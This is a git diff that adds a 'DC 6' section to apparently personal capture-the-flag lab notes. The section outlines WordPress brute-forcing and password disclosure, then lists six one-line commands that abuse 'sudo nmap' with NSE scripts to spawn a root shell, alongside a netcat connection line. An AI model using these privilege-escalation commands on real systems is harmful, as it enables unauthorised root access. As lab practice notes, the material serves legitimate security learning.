@@ -145,3 +145,27 @@ nc -nv $IP $PORT
 
 # bling bling !!!
 ```
+
+## DC 6 
+```bash
+# [Wordpress Exploitation]:-
+  *  Version, Username, Password Brute-force
+# [Sensitive file Disclosure]:- Password Exposed
+  *  (txt, php, db, sql, Wordpress Hashes)
+# /home Directory File Analysis
+  *  (Write && Execution Permissions)  
+
+### Post Expoitation !
+[sudo /usr/bin/nmap]:- 6 ways to Exploit it...
+
+> echo "os.execute('/bin/sh')">/tmp/root.nse && sudo nmap --script=/tmp/root.nse 
+> TF=$(mktemp).nse; echo 'prerule=function() return true end; action=function() os.execute("/bin/sh") end' > $TF; sudo nmap --script=$TF
+> TF=$(mktemp).nse; echo 'prerule=function() return true end; action=function() os.execute("/bin/bash -p") end' > $TF; sudo nmap --script=$TF
+> TF=$(mktemp); echo 'os.execute("/bin/sh")' > $TF; sudo nmap --script=$TF
+> TF=$(mktemp).nse; echo 'os.execute("/bin/sh")' > $TF; sudo nmap --script=$TF
+> TF=$(mktemp).nse; echo 'prerule=function()return true end;action=function()os.execute("script -qc /bin/bash /dev/null")end' > $TF; sudo nmap --script=$TF
+
+
+# bling bling !!!
+```
+
